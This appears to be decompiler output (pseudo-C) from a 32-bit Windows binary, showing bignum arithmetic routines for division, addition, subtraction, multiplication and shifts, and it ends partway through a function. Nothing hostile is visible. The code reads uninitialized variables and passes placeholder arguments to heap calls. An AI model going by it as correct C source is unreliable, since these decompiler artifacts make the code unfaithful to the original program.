int32_t function_4026f0(int32_t a1, int32_t a2, int32_t a3) {
    uint32_t v1 = *(int32_t *)(a3 + 4); // 0x402700
    uint32_t v2 = *(int32_t *)(a3 + 8); // 0x402703
    int32_t v3 = *(int32_t *)a3; // 0x402707
    uint32_t v4 = *(int32_t *)(a3 + 12); // 0x402709
    int32_t v5; // bp-76, 0x4026f0
    int32_t * v6 = &v5; // 0x402724
    int32_t v7 = a1; // 0x402724
    int32_t v8 = 0; // 0x402724
    if (v3 != 0) {
        int32_t * hHeap = GetProcessHeap(); // 0x402733
        int32_t v9 = (int32_t)hHeap; // bp-88, 0x402739
        v7 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
        v8 = function_4020b0(a2, v3);
        v6 = &v9;
    }
    int32_t v10 = a2 - 2; // 0x402771
    uint32_t v11 = v4 / 0x10000; // 0x402774
    int32_t v12 = v4 & 0xffff;
    int32_t v13 = v2 & 0xffff; // 0x402780
    uint32_t v14 = v2 / 0x10000; // 0x402783
    int32_t v15 = v10; // 0x40279d
    int32_t result = *(int32_t *)(4 * a2 - 4 + v7); // 0x40279d
    int32_t v16; // 0x4026f0
    int32_t v17 = v16 + 4 * v10;
    uint32_t v18 = *(int32_t *)(v7 - v16 + v17); // 0x4027a0
    uint32_t v19 = v8 / 0x10000; // 0x4027a8
    uint32_t v20 = v19 * v12; // 0x4027ab
    int32_t v21 = v19 * v11; // 0x4027b4
    int32_t v22 = v8 & 0xffff; // 0x4027ba
    uint32_t v23 = v22 * v12; // 0x4027c3
    uint32_t v24 = v22 * v11 + v20 + v23 / 0x10000; // 0x4027cd
    uint32_t v25 = 0x10000 * v24 | v23 & 0xffff; // 0x4027e9
    uint32_t v26 = v25 + result; // 0x4027ee
    int32_t v27 = v24 / 0x10000 + v8 + (v24 >= v20 ? v21 : v21 + 0x10000);
    uint32_t v28 = v27 + (int32_t)(v26 < v25); // 0x4027fe
    int32_t v29 = v28 & 0xffff; // 0x40280d
    int32_t v30 = (v26 < v25 ? 2 : 1) + v27; // 0x402818
    uint32_t v31 = v18 - v2; // 0x402826
    uint32_t v32 = v28 / 0x10000; // 0x402833
    int32_t v33 = v32 * v14; // 0x40283e
    uint32_t v34 = v29 * v13; // 0x402847
    uint32_t v35 = v29 * v14; // 0x40284b
    uint32_t v36 = v32 * v13 + v35 + v34 / 0x10000; // 0x402859
    uint32_t v37 = 0x10000 * v36 | v34 & 0xffff; // 0x402866
    int32_t v38 = v36 >= v35 ? v33 : v33 + 0x10000; // 0x40286a
    uint32_t v39 = result + (int32_t)(v18 < v2) + -1 * v30 * v1 - v36 / 0x10000 - v38 + (int32_t)(v31 < v37); // 0x402881
    uint32_t v40 = v31 - v37; // 0x402886
    int32_t v41 = v39 >= v26; // 0x402892
    int32_t v42 = v30 + v41; // 0x402895
    uint32_t v43 = (v2 & v41) + v40; // 0x402899
    int32_t v44 = (v1 & v41) + v39 + (int32_t)(v43 < v40); // 0x4028a9
    int32_t v45 = v44; // 0x4028b0
    int32_t v46 = v43; // 0x4028b0
    int32_t v47 = v42; // 0x4028b0
    if (v44 >= v1) {
        // 0x4028b2
        v45 = v44;
        v46 = v43;
        v47 = v42;
        if (v43 < v2 != v44 <= v1) {
            // 0x4028b8
            v45 = (int32_t)(v43 < v2) - v1 + v44;
            v46 = v43 - v2;
            v47 = v42 + 1;
        }
    }
    // 0x4028c8
    result = v46;
    int32_t v48 = v45;
    if (v16 != 0) {
        // 0x4028d1
        *(int32_t *)v17 = v47;
    }
    // 0x4028d3
    v15--;
    int32_t v49 = v17 - 4; // 0x4028e5
    while (v15 >= 0) {
        // 0x4027a0
        v17 = v49;
        v18 = *(int32_t *)(v7 - v16 + v17);
        v19 = v48 / 0x10000;
        v20 = v19 * v12;
        v21 = v19 * v11;
        v22 = v48 & 0xffff;
        v23 = v22 * v12;
        v24 = v22 * v11 + v20 + v23 / 0x10000;
        v25 = 0x10000 * v24 | v23 & 0xffff;
        v26 = v25 + result;
        v27 = v24 / 0x10000 + v48 + (v24 >= v20 ? v21 : v21 + 0x10000);
        v28 = v27 + (int32_t)(v26 < v25);
        v29 = v28 & 0xffff;
        v30 = (v26 < v25 ? 2 : 1) + v27;
        v31 = v18 - v2;
        v32 = v28 / 0x10000;
        v33 = v32 * v14;
        v34 = v29 * v13;
        v35 = v29 * v14;
        v36 = v32 * v13 + v35 + v34 / 0x10000;
        v37 = 0x10000 * v36 | v34 & 0xffff;
        v38 = v36 >= v35 ? v33 : v33 + 0x10000;
        v39 = result + (int32_t)(v18 < v2) + -1 * v30 * v1 - v36 / 0x10000 - v38 + (int32_t)(v31 < v37);
        v40 = v31 - v37;
        v41 = v39 >= v26;
        v42 = v30 + v41;
        v43 = (v2 & v41) + v40;
        v44 = (v1 & v41) + v39 + (int32_t)(v43 < v40);
        v45 = v44;
        v46 = v43;
        v47 = v42;
        if (v44 >= v1) {
            // 0x4028b2
            v45 = v44;
            v46 = v43;
            v47 = v42;
            if (v43 < v2 != v44 <= v1) {
                // 0x4028b8
                v45 = (int32_t)(v43 < v2) - v1 + v44;
                v46 = v43 - v2;
                v47 = v42 + 1;
            }
        }
        // 0x4028c8
        result = v46;
        v48 = v45;
        if (v16 != 0) {
            // 0x4028d1
            *(int32_t *)v17 = v47;
        }
        // 0x4028d3
        v15--;
        v49 = v17 - 4;
    }
    int32_t result2; // 0x4026f0
    if (v3 == 0) {
        // 0x402926
        *(int32_t *)(result2 + 4) = v48;
        *(int32_t *)result2 = result;
        return result;
    }
    int32_t v50 = (int32_t)v6;
    *(int32_t *)(v50 - 4) = v7;
    uint32_t v51 = v3 & 31; // 0x402902
    *(int32_t *)(v50 - 8) = 0;
    *(int32_t *)(v50 - 12) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)result2 = result >> v51 | v48 << (-v3 & 31);
    *(int32_t *)(result2 + 4) = v48 >> v51;
    return result2;
}

// Address range: 0x402940 - 0x402bc1
int32_t function_402940(int32_t a1, int32_t a2, int32_t a3, int32_t a4, uint32_t a5) {
    int32_t result = 4 * a4; // 0x402951
    int32_t v1 = result - 4; // 0x40295b
    uint32_t v2 = *(int32_t *)(v1 + a3); // 0x40295b
    uint32_t v3 = *(int32_t *)(a3 - 8 + result); // 0x40295f
    int32_t v4; // bp-72, 0x402940
    int32_t v5 = &v4; // 0x40296c
    int32_t v6 = a1 - a4; // 0x402977
    int32_t v7; // 0x402940
    int32_t v8 = v7 + 4 * a1;
    int32_t v9 = a5 & 0xffff;
    uint32_t v10 = a5 / 0x10000;
    uint32_t v11 = v3 / 0x10000;
    int32_t v12 = v3 & 0xffff;
    int32_t * v13 = (int32_t *)(v5 - 4);
    int32_t * v14 = (int32_t *)(v5 - 8);
    uint32_t v15 = a4 - 1;
    int32_t v16 = v8; // 0x4029a2
    int32_t v17 = v8 - 8;
    int32_t v18 = v7 + 4 * v6;
    v16 -= 4;
    int32_t * v19 = (int32_t *)v16; // 0x4029a5
    int32_t v20 = *v19; // 0x4029a5
    int32_t v21; // 0x402940
    int32_t v22; // 0x402940
    int32_t v23; // 0x402940
    int32_t v24; // 0x402940
    int32_t v25; // 0x402940
    int32_t v26; // 0x402940
    int32_t v27; // 0x402940
    uint32_t v28; // 0x402940
    int32_t v29; // 0x402940
    uint32_t v30; // 0x402940
    uint32_t v31; // 0x402940
    uint32_t v32; // 0x402940
    int32_t v33; // 0x402940
    int32_t v34; // 0x402940
    int32_t v35; // 0x402940
    int32_t v36; // 0x402940
    uint32_t v37; // 0x4029db
    int32_t v38; // 0x4029de
    uint32_t v39; // 0x4029fe
    uint32_t v40; // 0x402a16
    uint32_t v41; // 0x402a1e
    int32_t * v42; // 0x402a20
    uint32_t v43; // 0x402a20
    int32_t v44; // 0x402940
    uint32_t v45; // 0x402a2f
    int32_t v46; // 0x402a46
    uint32_t v47; // 0x402a55
    int32_t v48; // 0x402a5c
    uint32_t v49; // 0x402a61
    uint32_t v50; // 0x402a8c
    uint32_t v51; // 0x402a96
    int32_t v52; // 0x402aa0
    uint32_t v53; // 0x402ab2
    uint32_t v54; // 0x402abb
    int32_t v55; // 0x402ac4
    int32_t v56; // 0x402ac7
    uint32_t v57; // 0x402acc
    int32_t v58; // 0x402ade
    uint32_t v59; // 0x402b0b
    uint32_t v60; // 0x402b1c
    int32_t v61; // 0x402b1e
    int32_t * v62; // 0x402b40
    uint32_t v63; // 0x402b45
    uint32_t v64; // 0x402b4b
    uint32_t v65; // 0x402b4b
    int32_t v66; // 0x402b58
    int32_t v67; // 0x402b5b
    if (a2 == v2 == v20 == v3) {
        // 0x4029b3
        *v13 = -1;
        *v14 = a4;
        function_401ed0(v6, v17, v16, v3);
        v34 = *v19;
        v27 = -1;
    } else {
        // 0x4029d4
        v37 = a2 / 0x10000;
        v38 = a2 & 0xffff;
        v28 = v38 * v9;
        v29 = v37 * v10;
        v30 = v37 * v9;
        v39 = v38 * v10 + v30 + v28 / 0x10000;
        v40 = 0x10000 * v39 | v28 & 0xffff;
        v41 = v40 + v20;
        v42 = (int32_t *)v17;
        v43 = *v42;
        v44 = v39 / 0x10000 + a2 + (v39 >= v30 ? v29 : v29 + 0x10000);
        v45 = v44 + (int32_t)(v41 < v40);
        v46 = (v41 < v40 ? 2 : 1) + v44;
        v47 = v43 - v3;
        v48 = v45 & 0xffff;
        v49 = v45 / 0x10000;
        v31 = v48 * v12;
        v32 = v48 * v11;
        v33 = v49 * v11;
        v50 = v49 * v12 + v32 + v31 / 0x10000;
        v51 = 0x10000 * v50 | v31 & 0xffff;
        v52 = v50 >= v32 ? v33 : v33 + 0x10000;
        v53 = v47 - v51;
        v54 = -1 * v46 * v2 + v20 - v50 / 0x10000 - v52 + (int32_t)(v43 < v3) + (int32_t)(v47 < v51);
        v55 = v54 >= v41;
        v56 = v46 + v55;
        v57 = (v3 & v55) + v53;
        v58 = (v2 & v55) + v54 + (int32_t)(v57 < v53);
        v35 = v56;
        v23 = v58;
        v24 = v57;
        if (v58 >= v2) {
            // 0x402ae4
            v35 = v56;
            v23 = v58;
            v24 = v57;
            if (v57 < v3 != v58 <= v2) {
                // 0x402aed
                v35 = v56 + 1;
                v23 = (int32_t)(v57 < v3) - v2 + v58;
                v24 = v57 - v3;
            }
        }
        // 0x402afd
        v36 = v35;
        *v13 = v36;
        *v14 = a4 - 2;
        v59 = function_401ed0(v41, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v60 = (int32_t)(v24 < v59);
        v61 = v23 - v60;
        *v42 = v24 - v59;
        v34 = v61;
        v27 = v36;
        if (v23 < v60) {
            // 0x402b29
            v21 = 0;
            v26 = v18;
            v25 = 0;
            v22 = 0;
            if (v15 >= 1) {
                v62 = (int32_t *)v26;
                v63 = *v62 + v21;
                v64 = *(int32_t *)(4 * v25 + a3);
                v65 = v63 + v64;
                *v62 = v65;
                v66 = v25 + 1;
                v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                v21 = v67;
                v26 += 4;
                v25 = v66;
                v22 = v67;
                while (v66 != v15) {
                    // 0x402b40
                    v62 = (int32_t *)v26;
                    v63 = *v62 + v21;
                    v64 = *(int32_t *)(4 * v25 + a3);
                    v65 = v63 + v64;
                    *v62 = v65;
                    v66 = v25 + 1;
                    v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                    v21 = v67;
                    v26 += 4;
                    v25 = v66;
                    v22 = v67;
                }
            }
            // 0x402b68
            v34 = v61 + v2 + v22;
            v27 = v36 - 1;
        }
    }
    int32_t v68 = v34;
    int32_t v69; // 0x402940
    if (v69 != 0) {
        // 0x402b85
        *(int32_t *)(v69 - v7 + v18) = v27;
    }
    int32_t v70 = v6 - 1; // 0x402b95
    int32_t v71 = v18 - 4; // 0x402baa
    int32_t v72 = v17 - 4; // 0x402baa
    while (v70 >= 0) {
        uint32_t v73 = v68;
        v17 = v72;
        int32_t v74 = v70;
        v18 = v71;
        v16 -= 4;
        v19 = (int32_t *)v16;
        v20 = *v19;
        if (v73 == v2 == v20 == v3) {
            // 0x4029b3
            *v13 = -1;
            *v14 = a4;
            function_401ed0(v74, v17, v16, v3);
            v34 = *v19;
            v27 = -1;
        } else {
            // 0x4029d4
            v37 = v73 / 0x10000;
            v38 = v73 & 0xffff;
            v28 = v38 * v9;
            v29 = v37 * v10;
            v30 = v37 * v9;
            v39 = v38 * v10 + v30 + v28 / 0x10000;
            v40 = 0x10000 * v39 | v28 & 0xffff;
            v41 = v40 + v20;
            v42 = (int32_t *)v17;
            v43 = *v42;
            v44 = v39 / 0x10000 + v73 + (v39 >= v30 ? v29 : v29 + 0x10000);
            v45 = v44 + (int32_t)(v41 < v40);
            v46 = (v41 < v40 ? 2 : 1) + v44;
            v47 = v43 - v3;
            v48 = v45 & 0xffff;
            v49 = v45 / 0x10000;
            v31 = v48 * v12;
            v32 = v48 * v11;
            v33 = v49 * v11;
            v50 = v49 * v12 + v32 + v31 / 0x10000;
            v51 = 0x10000 * v50 | v31 & 0xffff;
            v52 = v50 >= v32 ? v33 : v33 + 0x10000;
            v53 = v47 - v51;
            v54 = -1 * v46 * v2 + v20 - v50 / 0x10000 - v52 + (int32_t)(v43 < v3) + (int32_t)(v47 < v51);
            v55 = v54 >= v41;
            v56 = v46 + v55;
            v57 = (v3 & v55) + v53;
            v58 = (v2 & v55) + v54 + (int32_t)(v57 < v53);
            v35 = v56;
            v23 = v58;
            v24 = v57;
            if (v58 >= v2) {
                // 0x402ae4
                v35 = v56;
                v23 = v58;
                v24 = v57;
                if (v57 < v3 != v58 <= v2) {
                    // 0x402aed
                    v35 = v56 + 1;
                    v23 = (int32_t)(v57 < v3) - v2 + v58;
                    v24 = v57 - v3;
                }
            }
            // 0x402afd
            v36 = v35;
            *v13 = v36;
            *v14 = a4 - 2;
            v59 = function_401ed0(v41, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v60 = (int32_t)(v24 < v59);
            v61 = v23 - v60;
            *v42 = v24 - v59;
            v34 = v61;
            v27 = v36;
            if (v23 < v60) {
                // 0x402b29
                v21 = 0;
                v26 = v18;
                v25 = 0;
                v22 = 0;
                if (v15 >= 1) {
                    v62 = (int32_t *)v26;
                    v63 = *v62 + v21;
                    v64 = *(int32_t *)(4 * v25 + a3);
                    v65 = v63 + v64;
                    *v62 = v65;
                    v66 = v25 + 1;
                    v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                    v21 = v67;
                    v26 += 4;
                    v25 = v66;
                    v22 = v67;
                    while (v66 != v15) {
                        // 0x402b40
                        v62 = (int32_t *)v26;
                        v63 = *v62 + v21;
                        v64 = *(int32_t *)(4 * v25 + a3);
                        v65 = v63 + v64;
                        *v62 = v65;
                        v66 = v25 + 1;
                        v67 = (int32_t)(v65 < v64) + (int32_t)(v63 < v21);
                        v21 = v67;
                        v26 += 4;
                        v25 = v66;
                        v22 = v67;
                    }
                }
                // 0x402b68
                v34 = v61 + v2 + v22;
                v27 = v36 - 1;
            }
        }
        // 0x402b7f
        v68 = v34;
        if (v69 != 0) {
            // 0x402b85
            *(int32_t *)(v69 - v7 + v18) = v27;
        }
        // 0x402b8b
        v70 = v74 - 1;
        v71 = v18 - 4;
        v72 = v17 - 4;
    }
    // 0x402bb0
    *(int32_t *)(v7 + v1) = v68;
    return result;
}

// Address range: 0x402bd0 - 0x402c75
int32_t function_402bd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x402bd0
    int32_t v1; // 0x402bd0
    if (a3 == 1) {
        int32_t result = function_4024f0(a1, a4); // 0x402beb
        *(int32_t *)v1 = result;
        return result;
    }
    if (a3 == 2) {
        // 0x402c00
        return function_4026f0(v1, a1, a4);
    }
    int32_t v2 = *(int32_t *)a4; // 0x402c1c
    int32_t v3 = 0; // 0x402c20
    if (v2 != 0) {
        // 0x402c22
        v3 = function_4020b0(a1, v2);
    }
    int32_t result2 = function_402940(a1, v3, a2, a3, *(int32_t *)(a4 + 12)); // 0x402c5e
    if (v2 != 0) {
        // 0x402c60
        result2 = function_402130(a3, v2);
    }
    // 0x402c6e
    return result2;
}

// Address range: 0x402c80 - 0x402cc7
int32_t function_402c80(void) {
    // 0x402c80
    int32_t v1; // 0x402c80
    int32_t v2 = v1 - 1; // 0x402c86
    int32_t v3 = v2 < 0 == (v1 & -v1) < 0 == (v2 != 0) ? v1 : 1; // 0x402c89
    int32_t * v4 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x402ca2
    int32_t result = (int32_t)v4; // 0x402ca2
    int32_t v5; // 0x402c80
    *(int32_t *)v5 = v3;
    int32_t * v6 = (int32_t *)(v5 + 4); // 0x402cac
    int32_t v7 = *v6; // 0x402cac
    *(int32_t *)(v5 + 8) = result;
    if ((v7 < 0 ? -v7 : v7) > v3) {
        // 0x402cbd
        *v6 = 0;
    }
    // 0x402cc4
    return result;
}

// Address range: 0x402cd0 - 0x402d5e
int32_t function_402cd0(void) {
    // 0x402cd0
    int32_t v1; // 0x402cd0
    int32_t v2; // 0x402cd0
    if (v2 == v1) {
        // 0x402d59
        int32_t result; // 0x402cd0
        return result;
    }
    int32_t * v3 = (int32_t *)(v1 + 4); // 0x402ce0
    int32_t v4 = *v3; // 0x402ce0
    int32_t * v5 = (int32_t *)(v2 + 8); // 0x402ce3
    int32_t v6 = *v5; // 0x402ce3
    int32_t v7 = v4 < 0 ? -v4 : v4; // 0x402ced
    int32_t v8 = v6; // 0x402cf1
    if (v7 > v6) {
        int32_t v9 = v7 - 1; // 0x402cf8
        int32_t v10 = v9 < 0 == (v7 & -v7) < 0 == (v9 != 0) ? v7 : 1; // 0x402cfa
        int32_t * v11 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x402d0f
        int32_t v12 = (int32_t)v11; // 0x402d0f
        *(int32_t *)v2 = v10;
        int32_t * v13 = (int32_t *)(v2 + 4); // 0x402d19
        int32_t v14 = *v13; // 0x402d19
        *v5 = v12;
        v8 = v12;
        if ((v14 < 0 ? -v14 : v14) > v10) {
            // 0x402d28
            *v13 = 0;
            v8 = v12;
        }
    }
    int32_t result2; // 0x402d51
    if (v7 < 1) {
        // 0x402d51
        result2 = *v3;
        *(int32_t *)(v2 + 4) = result2;
        // 0x402d59
        return result2;
    }
    int32_t v15 = *(int32_t *)(v1 + 8) - v8; // 0x402d3b
    int32_t v16 = 0; // 0x402d3d
    int32_t v17 = v8;
    v16++;
    *(int32_t *)v17 = *(int32_t *)(v15 + v17);
    int32_t v18 = v17 + 4; // 0x402d4c
    while (v16 != v7) {
        // 0x402d40
        v17 = v18;
        v16++;
        *(int32_t *)v17 = *(int32_t *)(v15 + v17);
        v18 = v17 + 4;
    }
    // 0x402d51
    result2 = *v3;
    *(int32_t *)(v2 + 4) = result2;
    // 0x402d59
    return result2;
}

// Address range: 0x402d60 - 0x402e88
int32_t function_402d60(int32_t a1) {
    // 0x402d60
    int32_t v1; // 0x402d60
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x402d73
    int32_t v3 = *(int32_t *)(a1 + 4); // 0x402d79
    int32_t v4 = v2 < 0 ? -v2 : v2; // 0x402d7e
    int32_t v5 = v3 < 0 ? -v3 : v3; // 0x402d83
    int32_t v6 = v4 - v5; // 0x402d85
    uint32_t v7 = v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? v5 : v4; // 0x402d8c
    int32_t v8; // 0x402d60
    int32_t v9 = *(int32_t *)(v8 + 8); // 0x402dac
    int32_t v10 = *(int32_t *)((v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? v1 : a1) + 8); // 0x402e09
    int32_t v11 = 0; // 0x402e11
    if (v7 >= 1) {
        int32_t v12 = *(int32_t *)((v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? a1 : v1) + 8); // 0x402e04
        int32_t v13 = 0; // 0x402e1e
        int32_t v14 = v7; // 0x402e1e
        int32_t v15 = v10; // 0x402e1e
        uint32_t v16 = *(int32_t *)v15 + v13; // 0x402e25
        uint32_t v17 = *(int32_t *)(v12 - v10 + v15); // 0x402e2b
        uint32_t v18 = v16 + v17; // 0x402e2b
        v13 = (int32_t)(v18 < v17) + (int32_t)(v16 < v13);
        *(int32_t *)(v9 - v10 + v15) = v18;
        v14--;
        v15 += 4;
        v11 = v13;
        while (v14 != 0) {
            // 0x402e20
            v16 = *(int32_t *)v15 + v13;
            v17 = *(int32_t *)(v12 - v10 + v15);
            v18 = v16 + v17;
            v13 = (int32_t)(v18 < v17) + (int32_t)(v16 < v13);
            *(int32_t *)(v9 - v10 + v15) = v18;
            v14--;
            v15 += 4;
            v11 = v13;
        }
    }
    uint32_t v19 = v6 < 0 == ((v6 ^ v4) & (v5 ^ v4)) < 0 ? v4 : v5; // 0x402d97
    if (v19 <= v7) {
        // 0x402e79
        *(int32_t *)(4 * v19 + v9) = v11;
        return v11 + v19;
    }
    int32_t v20 = v11; // 0x402e5d
    int32_t v21 = 4 * v7 + v9; // 0x402e5d
    int32_t v22 = 0; // 0x402e5d
    uint32_t v23 = *(int32_t *)(v10 - v9 + v21) + v20; // 0x402e66
    *(int32_t *)v21 = v23;
    v22++;
    v20 = v23 < v20;
    v21 += 4;
    int32_t v24 = v20; // 0x402e74
    while (v22 < v19 - v7) {
        // 0x402e60
        v23 = *(int32_t *)(v10 - v9 + v21) + v20;
        *(int32_t *)v21 = v23;
        v22++;
        v20 = v23 < v20;
        v21 += 4;
        v24 = v20;
    }
    // 0x402e79
    *(int32_t *)(4 * v19 + v9) = v24;
    return v24 + v19;
}

// Address range: 0x402e90 - 0x402ff1
int32_t function_402e90(int32_t a1) {
    // 0x402e90
    int32_t v1; // 0x402e90
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x402ea0
    int32_t result = v2 < 0 ? -v2 : v2; // 0x402eac
    int32_t v3 = *(int32_t *)(a1 + 4); // 0x402eae
    int32_t * v4 = (int32_t *)(a1 + 8); // 0x402eb1
    int32_t v5 = v3 < 0 ? -v3 : v3; // 0x402eb9
    int32_t * v6 = (int32_t *)(v1 + 8); // 0x402ebe
    int32_t v7 = *v6; // 0x402ebe
    if (result == v5) {
        int32_t v8 = *v4; // 0x402eb1
        int32_t v9 = result - 1; // 0x402ed5
        if (v9 < 0) {
            // 0x402f85
            return 0;
        }
        int32_t v10 = 4 * v9 + v8; // 0x402ee1
        int32_t v11 = v9; // 0x402ee1
        uint32_t v12 = *(int32_t *)(v7 - v8 + v10); // 0x402ee4
        uint32_t v13 = *(int32_t *)v10; // 0x402ee7
        while (v13 == v12) {
            // 0x402ef1
            v11--;
            v10 -= 4;
            if (v11 < 0) {
                // 0x402f85
                return 0;
            }
            v12 = *(int32_t *)(v7 - v8 + v10);
            v13 = *(int32_t *)v10;
        }
        if (v13 < v12) {
            goto lab_0x402f09;
        } else {
            goto lab_0x402f9b;
        }
    } else {
        int32_t v14 = result - v5; // 0x402ec7
        if (v14 < 0 == ((v14 ^ result) & (v5 ^ result)) < 0) {
            goto lab_0x402f09;
        } else {
            goto lab_0x402f9b;
        }
    }
  lab_0x402f09:;
    // 0x402f09
    int32_t v15; // 0x402e90
    int32_t * v16 = (int32_t *)(v15 + 8); // 0x402f09
    int32_t v17 = *v16; // 0x402f11
    int32_t v18; // bp-28, 0x402e90
    int32_t v19 = &v18; // 0x402f11
    if (result > v15) {
        int32_t v20 = result - 1; // 0x402f18
        int32_t v21 = v20 < 0 == (result & -result) < 0 == (v20 != 0) ? result : 1; // 0x402f1a
        int32_t * hHeap = GetProcessHeap(); // 0x402f28
        int32_t v22 = (int32_t)hHeap; // bp-44, 0x402f2e
        int32_t v23 = &v22; // 0x402f2e
        int32_t * v24 = HeapReAlloc(hHeap, (int32_t)&g266, &g266, (int32_t)&g266); // 0x402f2f
        int32_t v25 = (int32_t)v24; // 0x402f2f
        *v16 = v25;
        int32_t * v26 = (int32_t *)(v15 + 4); // 0x402f3e
        int32_t v27 = *v26; // 0x402f3e
        *(int32_t *)v15 = v21;
        v17 = v25;
        v19 = v23;
        if ((v27 < 0 ? -v27 : v27) > v21) {
            // 0x402f4c
            *v26 = 0;
            v17 = v25;
            v19 = v23;
        }
    }
    // 0x402f53
    *(int32_t *)(v19 - 4) = v5;
    *(int32_t *)(v19 - 8) = *v4;
    *(int32_t *)(v19 - 12) = result;
    function_401d90(v17, (int32_t)&g266, (int32_t)&g266);
    if (result < 1) {
        // 0x402f85
        return result;
    }
    int32_t v28 = 4 * result - 4 + v17; // 0x402f75
    int32_t v29 = result; // 0x402f75
    int32_t result2 = v29; // 0x402f7b
    while (*(int32_t *)v28 == 0) {
        int32_t v30 = v29 - 1; // 0x402f7d
        v28 -= 4;
        v29 = v30;
        result2 = v30;
        if (v30 >= 0 != v30 != 0) {
            // break -> 0x402f85
            break;
        }
        result2 = v29;
    }
    // 0x402f85
    return result2;
  lab_0x402f9b:;
    int32_t v31; // 0x402e90
    int32_t v32; // 0x402e90
    if (v5 > v15) {
        int32_t v33 = function_402c80(); // 0x402fa1
        v31 = *v6;
        v32 = v33;
    } else {
        // 0x402faa
        v31 = v7;
        v32 = *(int32_t *)(v15 + 8);
    }
    // 0x402fad
    function_401d90(v5, v31, result);
    if (v5 < 1) {
        // 0x402fdd
        return -v5;
    }
    int32_t v34 = 4 * v5 - 4 + v32; // 0x402fcf
    int32_t v35 = v5; // 0x402fcf
    int32_t v36 = v35; // 0x402fd3
    while (*(int32_t *)v34 == 0) {
        int32_t v37 = v35 - 1; // 0x402fd5
        v34 -= 4;
        v35 = v37;
        v36 = v37;
        if (v37 >= 0 != v37 != 0) {
            // break -> 0x402fdd
            break;
        }
        v36 = v35;
    }
    // 0x402fdd
    return -v36;
}

// Address range: 0x403000 - 0x403038
int32_t function_403000(int32_t a1) {
    // 0x403000
    int32_t v1; // 0x403000
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x403012
    int32_t v3; // 0x403000
    if ((*v2 ^ *(int32_t *)(a1 + 4)) < 0) {
        // 0x40301e
        v3 = function_402e90(a1);
    } else {
        // 0x403017
        v3 = function_402d60(a1);
    }
    int32_t result = -v3; // 0x403028
    int32_t v4; // 0x403000
    *(int32_t *)(v4 + 4) = *v2 < 0 ? result : v3;
    return result;
}

// Address range: 0x403040 - 0x403078
int32_t function_403040(int32_t a1) {
    // 0x403040
    int32_t v1; // 0x403040
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x403052
    int32_t v3; // 0x403040
    if ((*v2 ^ *(int32_t *)(a1 + 4)) < 0) {
        // 0x40305e
        v3 = function_402d60(a1);
    } else {
        // 0x403057
        v3 = function_402e90(a1);
    }
    int32_t result = -v3; // 0x403068
    int32_t v4; // 0x403040
    *(int32_t *)(v4 + 4) = *v2 < 0 ? result : v3;
    return result;
}

// Address range: 0x403080 - 0x403165
int32_t function_403080(int32_t a1) {
    // 0x403080
    int32_t v1; // 0x403080
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x40308d
    int32_t v3; // 0x403080
    if (v2 == 0) {
        // 0x403157
        *(int32_t *)(v3 + 4) = 0;
        int32_t result; // 0x403080
        return result;
    }
    int32_t v4 = *(int32_t *)(a1 + 4); // 0x40309b
    if (v4 == 0) {
        // 0x403157
        *(int32_t *)(v3 + 4) = 0;
        return 0;
    }
    int32_t v5 = v2 < 0 ? -v2 : v2; // 0x4030b5
    int32_t v6 = v4 < 0 ? -v4 : v4; // 0x4030bd
    int32_t v7 = v6 + v5; // 0x4030c2
    int32_t v8 = 32 * v7; // 0x4030c9
    int32_t * hHeap = GetProcessHeap(); // 0x4030e0
    int32_t v9 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x4030e7
    int32_t v10 = *(int32_t *)((v5 < v6 ? v1 : a1) + 8);
    function_401f90(v5 < v6 ? v6 : v5, v10, v5 < v6 ? v5 : v6);
    int32_t v11 = *(int32_t *)(4 * v7 - 4 + v9) == 0; // 0x403124
    *(int32_t *)v3 = (v8 - (int32_t)(v8 != 0)) / 32 + 1;
    *(int32_t *)(v3 + 4) = (v4 ^ v2) >= 0 ? v7 - v11 : v11 - v7;
    *(int32_t *)(v3 + 8) = v9;
    return HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
}

// Address range: 0x403170 - 0x403287
int32_t function_403170(uint32_t a1) {
    // 0x403170
    int32_t v1; // 0x403170
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40317f
    int32_t result = *v2; // 0x40317f
    int32_t v3 = result < 0 ? -result : result; // 0x403187
    int32_t v4; // 0x403170
    if (v3 == 0) {
        // 0x40318b
        *(int32_t *)(v4 + 4) = v3;
        return result;
    }
    int32_t v5 = a1 & 31; // 0x40319b
    int32_t v6 = a1 / 32; // 0x40319e
    int32_t * v7 = (int32_t *)(v4 + 8); // 0x4031a4
    int32_t v8 = v3 + v6;
    int32_t v9 = v8 + (int32_t)(v5 != 0); // 0x4031b3
    int32_t v10; // bp-32, 0x403170
    int32_t * v11 = &v10; // 0x4031ba
    int32_t v12 = *v7; // 0x4031ba
    if (v9 > v4) {
        int32_t v13 = v9 - 1; // 0x4031c1
        int32_t v14 = v13 < 0 == (v9 & -v9) < 0 == (v13 != 0) ? v9 : 1; // 0x4031c3
        int32_t * hHeap = GetProcessHeap(); // 0x4031d4
        int32_t v15 = (int32_t)hHeap; // bp-48, 0x4031da
        int32_t * v16 = HeapReAlloc(hHeap, (int32_t)&g266, &g266, (int32_t)&g266); // 0x4031db
        int32_t v17 = (int32_t)v16; // 0x4031db
        *v7 = v17;
        int32_t * v18 = (int32_t *)(v4 + 4); // 0x4031ea
        int32_t v19 = *v18; // 0x4031ea
        *(int32_t *)v4 = v14;
